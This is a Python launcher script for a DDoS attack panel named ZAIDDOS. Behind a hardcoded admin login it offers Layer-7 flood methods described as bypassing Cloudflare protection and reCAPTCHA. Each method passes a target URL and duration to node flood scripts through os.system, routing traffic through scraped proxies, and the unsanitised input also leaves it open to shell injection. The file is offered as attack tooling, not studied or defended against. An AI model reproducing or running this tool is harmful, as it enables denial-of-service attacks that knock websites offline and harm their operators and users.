# -*- developer: @zaibuzaiii -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
from colorama import Fore, Back, init
import codecs


proxys = open('methods/proxy.txt').readlines()
bots = len(proxys)

def color(data_input_output):
    random_output = data_input_output
    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[30m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[37m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data

lightwhite = color("LIGHTWHITE_EX")
gray = color("LIGHTBLACK_EX")

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

os.system("cls" if os.name == "nt" else "clear")
#time.sleep(5.0)
print('''

         █     █░▓█████  ██▓     ▄████▄   ▒█████   ███▄ ▄███▓▓█████ 
         ▓█░ █ ░█░▓█   ▀ ▓██▒    ▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒▓█   ▀ 
         ▒█░ █ ░█ ▒███   ▒██░    ▒▓█    ▄ ▒██░  ██▒▓██    ▓██░▒███   
         ░█░ █ ░█ ▒▓█  ▄ ▒██░    ▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██ ▒▓█  ▄ 
         ░░██▒██▓ ░▒████▒░██████▒▒ ▓███▀ ░░ ████▓▒░▒██▒   ░██▒░▒████▒
         ░ ▓░▒ ▒  ░░ ▒░ ░░ ▒░▓  ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ░  ░░░ ▒░ ░
         ▒ ░ ░   ░ ░  ░░ ░ ▒  ░  ░  ▒     ░ ▒ ▒░ ░  ░      ░ ░ ░  ░
         ░   ░     ░     ░ ░   ░        ░ ░ ░ ▒  ░      ░      ░   
         ░       ░  ░    ░  ░░ ░          ░ ░         ░      ░  ░
                             ░                                   

             WAIT FOR FIVE SECONDS (5) PANEL IS LOADING FOR YOU
 ''')
time.sleep(5.0)
os.system("cls" if os.name == "nt" else "clear")
uname=input("Input Your USERNAME to see on attack : ")

class Color:
    colorama.init()

def menu():
  print('''
\x1b[0m [\x1b[38;2;205;6;844mCLEAR\x1b[0m]  : CLEAR THE TERMINAL
\x1b[0m [\x1b[38;2;196;8;844mSCRAPE\x1b[0m] : PROXY SCRAPER 80mb++ Proxy's And save as proxy.txt
\x1b[0m [\x1b[38;2;160;15;845mMETHODS\x1b[0m] : SHOW METHODS
\x1b[0m [\x1b[38;2;160;15;845m!STOP\x1b[0m] : TO STOP ALL RUNNING ATTACKS
''')


def layer7():


              print(f"""
{Fore.WHITE}Layer 7{Fore.RED}:
{Fore.RED}- {Fore.WHITE}!MIX{Fore.RED}: {Fore.WHITE}HTTP2 use mix method bypassing uam{Fore.RED}.
{Fore.RED}- {Fore.WHITE}!BYPASS{Fore.RED}: {Fore.WHITE}HTTP2 bypassing recaptcha{Fore.RED}.  
{Fore.RED}- {Fore.WHITE}!HTTP{Fore.RED}: {Fore.WHITE}HTTP RAW flood make many RPS{Fore.RED}.  
{Fore.RED}- {Fore.WHITE}!HTTP-COSTUM{Fore.RED}: {Fore.WHITE}HTTP RAW flood make many RPS,bypass Uam and big backend{Fore.RED}.  
{Fore.RED}- {Fore.WHITE}!CF-BYPASS{Fore.RED}: {Fore.WHITE}HTTP2 bypass cf with 0% Http-ddos{Fore.RED}.
""")


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system('cls' if os.name == 'nt' else 'clear')

    print(f'''{Fore.RED}
    

        ▒███████▒ ▄▄▄       ██▓▓█████▄ ▓█████▄  ▒█████    ██████ 
        ▒ ▒ ▒ ▄▀░▒████▄    ▓██▒▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
        ░ ▒ ▄▀▒░ ▒██  ▀█▄  ▒██▒░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
          ▄▀▒   ░░██▄▄▄▄██ ░██░░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
        ▒███████▒ ▓█   ▓██▒░██░░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
        ░▒▒ ▓░▒░▒ ▒▒   ▓▒█░░▓   ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
        ░░▒ ▒ ░ ▒  ▒   ▒▒ ░ ▒ ░ ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
        ░ ░ ░ ░ ░  ░   ▒    ▒ ░ ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
          ░ ░          ░  ░ ░     ░       ░        ░ ░        ░  
        ░                       ░       ░                        
	            Type:- help (To See There Commands)
	    	        
''')

    while True:
        sys.stdout.write(f'\x1b]2;USER : {uname}, ZAIDDOS :: Online Users: [1] :: Attack Sended: [10] \x07')
        sin = input(" "+Back.WHITE+Fore.RED+f' {uname} x DDOS '+Fore.RESET+Back.RESET+" ►► ")
        sinput = sin.split(" ")[0]
        if sinput == "reset" or sinput == "RESET":
            os.system ("python3 panel.py")
        if sinput == "clear" or sinput == "cls":
            os.system("clear")
            main()
        if sinput == "help" or sinput == "HELP":
            menu()
        if sinput == "methods" or sinput == "METHODS" or sinput == "method":
            layer7()
        elif sinput == "scrape" or sinput == "SCRAPE":
                os.system(f'cd methods && python3 scrape.py')
                main()

#########LAYER-7########  
        elif sinput == "!MIX" or sinput == "!mix":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                time = sin.split()[3]
                os.system(f'cd methods && node MIX.js {url} {time} 10 4 proxy.txt')

            except ValueError:
                main()
            except IndexError:
                print("\033[36mExample Usage: !MIX https://example.com 443 60")

        elif sinput == "!BYPASS" or sinput == "!bypass":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                time = sin.split()[3]
                os.system(f'cd methods && node BYPASS.js {url} {time} 10 4 proxy.txt')
           
            except ValueError:
                main()
            except IndexError:
                print("\033[36mExample Usage: !BYPASS https://example.com 443 60")
        elif sinput == "!HTTP" or sinput == "!http":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                time = sin.split()[3]
                os.system(f'cd methods && node HTTP.js {url} {time} 4 10 proxy.txt --randrate')
            

            except ValueError:
                main()
            except IndexError:
                print("\033[36mExample Usage: !HTTP https://example.com 443 60")
        elif sinput == "!HTTP-COSTUM" or sinput == "!http-costum":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                time = sin.split()[3]
                os.system(f'cd methods && node HTTP-COSTUM.js HEAD {url} {time} 4 10 proxy.txt --bfm true --randrate --full')
            
            except ValueError:
                main()
            except IndexError:
                print("\033[36mExample Usage: !HTTP-COSTUM https://example.com 443 60")

        elif sinput == "!CF-BYPASS" or sinput == "!cf-bypass":
            try:
                url = sin.split()[1]
                port = sin.split()[2]
                time = sin.split()[3]
                os.system(f'cd methods && node CF-BYPASS.js {url} {time} 10 4 proxy.txt')
               
            except ValueError:
                main()
            except IndexError:
                print("\033[36mExample Usage: !CF-BYPASS https://example.com 443 60")

def login():
    os.system("clear")
    user = "admin"
    passwd = "admin"
    username = input("""

                           \33[0;32mLOGIN USER NAME SENDED BY OWNER : """)
    password = getpass.getpass(prompt="""
                           \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""
                               \033[1;31;4 @zaibuzaiii""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""
                          \33[0;32mWELLCOME To ZAIDDOS""")
        time.sleep(0.3)
    menu()
    main()


login()
